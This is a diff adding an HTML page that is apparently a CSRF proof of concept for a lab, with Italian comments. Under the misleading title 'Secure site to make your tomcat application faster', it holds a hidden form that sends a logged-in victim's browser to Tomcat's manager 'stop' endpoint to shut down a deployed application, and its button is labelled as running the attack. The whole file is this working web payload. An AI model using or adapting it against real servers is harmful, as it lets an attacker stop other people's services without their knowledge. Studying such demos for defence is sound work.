@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title> Secure site to make your tomcat application faster</title>
+</head>
+<body>
+<h1>Make your application faster</h1>
+<form id="csrfForm" action="http://localhost:8080/manager/text/stop" method="GET">
+    <!-- Token CSRF -->
+    <input type="hidden" name="csrfToken" value="TOKEN_CSRF">
+
+    <!-- Path dell'applicazione da fermare -->
+    <input type="hidden" name="path" value="/simple-app-1.0-SNAPSHOT">
+
+    <input type="submit" value="Esegui Attacco CSRF">
+</form>
+
+</body>
+</html>
